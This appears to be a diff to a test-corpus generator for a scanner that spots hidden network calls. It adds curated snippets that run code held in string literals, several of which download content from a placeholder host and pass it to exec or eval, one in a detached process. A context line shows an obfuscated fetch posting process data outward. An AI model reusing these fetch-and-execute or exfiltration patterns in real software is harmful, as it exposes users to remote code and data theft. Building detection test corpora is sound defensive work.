@@ -1307,6 +1307,29 @@ STRARR_CURATED = [
     "fetch(_0x33e1(0x1d4),{'method':'POST','body':process[_0x33e1(0x1d3)]});",
 ]
 
+# (0.1.8) programs written in string literals: the network call a literal's
+# text names is the literal's own code (core._dl_in_code), a template
+# literal's or an f-string's interpolation is the code around it
+RECEIVED_CURATED = [
+    'var execString = "var http = require(\'http\'), https = require(\'https\'), fs = require(\'fs\');"\n'
+    '  + "var req = doRequest(options, function(response) {"\n'
+    '  + "response.on(\'data\', function(chunk) { responseText += chunk; });"\n  + "});";\n'
+    'var syncProc = spawn(process.argv[0], ["-e", execString]);\n',
+    "import subprocess, sys\ncode = \"import urllib.request as u; print(u.urlopen('https://files.invalid/p').read())\"\n"
+    "subprocess.run([sys.executable, '-c', code])\n",
+    "import subprocess, sys\ncode = \"import urllib.request as u; exec(u.urlopen('https://files.invalid/p').read())\"\n"
+    "subprocess.run([sys.executable, '-c', code])\n",
+    "execSync(\"node -e \\\"require('https').get('https://files.invalid/p', r => r.pipe(process.stdout))\\\"\");\n",
+    "execSync(`node -e \"require('https').get('${u}', r => r.pipe(process.stdout))\"`);\n",
+    "execSync(`node -e \"${(await (await fetch(u)).text())}\"`);\n",
+    "import os\ncmd = f\"python -c \\\"import urllib.request as u; print(u.urlopen('{url}').read())\\\"\"\nos.system(cmd)\n",
+    "import os, requests\nos.system(f\"python -c \\\"{requests.get(u).text}\\\"\")\n",
+    "const s = \"require('https').get(u, r => { let d = ''; r.on('data', c => d += c); r.on('end', () => eval(d)); })\";\n"
+    "spawn(process.execPath, ['-e', s], { detached: true });\n",
+    "const code = `${await (await fetch(u)).text()}`;\neval(code);\n",
+    "const code = `fetch(u).then(r => r.text()).then(t => console.log(t))`;\nspawn(process.execPath, ['-e', code]);\n",
+    "x = rb'urlopen(u)' + f'{urlopen(u).read()}'\nexec(x)\n",
+]
 
 
 def corpus(seed=20260926, scale=1):
@@ -1318,7 +1341,7 @@ def corpus(seed=20260926, scale=1):
     rnd = random.Random(seed)
     cases = (list(CURATED) + SIGN_CURATED + PROSE_CURATED + SELF_CURATED + PERSIST_CURATED + PUBLISH_CURATED
              + DECODED_CURATED + SPAWN_CURATED + EXFIL_CURATED + SERVICE_CURATED + XOR_CURATED
-             + CHARCODE_CURATED + FLOW_CURATED + STRARR_CURATED)
+             + CHARCODE_CURATED + FLOW_CURATED + STRARR_CURATED + RECEIVED_CURATED)
     for pieces, count, most in ((MIXED, 2500, 14), (QUOTING, 1500, 16), (CD, 1500, 16), (NODE_E, 1500, 16),
                                 (SCRIPT, 1000, 12), (RECEIVED, 1500, 16), (SIGNS, 2000, 10), (PROSE, 2500, 16),
                                 (SELF, 1500, 14), (SELF_ASYNC, 2000, 12), (PERSIST, 2500, 10), (PUBLISH, 3000, 12), (DECODED, 4000, 12), (SPAWN, 3000, 10),
